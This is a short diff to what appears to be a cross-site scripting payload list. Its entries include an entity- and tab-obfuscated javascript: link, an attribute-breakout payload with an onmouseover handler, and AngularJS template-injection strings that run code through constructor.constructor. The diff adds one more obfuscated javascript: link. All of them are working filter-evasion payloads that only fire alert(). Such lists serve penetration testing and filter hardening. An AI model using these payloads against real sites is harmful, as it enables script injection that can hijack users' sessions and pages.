@@ -3,3 +3,4 @@ a/href=j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt​&colon;&lpar;a&Tab;l&Tab;e&Tab;
 "style="position:fixed;top:0;left:0;border:999em solid green;" onmouseover="alert(document.domain)"
 {{_c.constructor('alert(1)')()}}
 {{constructor.constructor('alert(1)')()}}
+payload --> <a href=javas&Tab;cript​:ale&Tab;rt()>clickme</a>
